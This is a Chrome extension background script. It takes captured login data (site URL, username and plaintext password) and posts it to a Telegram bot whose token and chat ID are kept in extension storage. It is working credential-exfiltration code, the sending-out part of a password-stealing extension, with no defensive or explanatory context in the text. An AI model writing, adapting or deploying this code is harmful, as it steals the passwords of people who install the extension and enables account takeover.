chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "saveCredentials") {
    chrome.storage.sync.get(["botToken", "chatId"], (data) => {
      if (!data.botToken || !data.chatId) return;

      const text = `🔐 New login detected\n\n` +
                   `URL: ${message.data.url}\n` +
                   `Username: ${message.data.username || "N/A"}\n` +
                   `Password: ${message.data.password}`;

      fetch(`https://api.telegram.org/bot${data.botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: data.chatId,
          text: text,
          parse_mode: "HTML"
        })
      });
    });
  }
});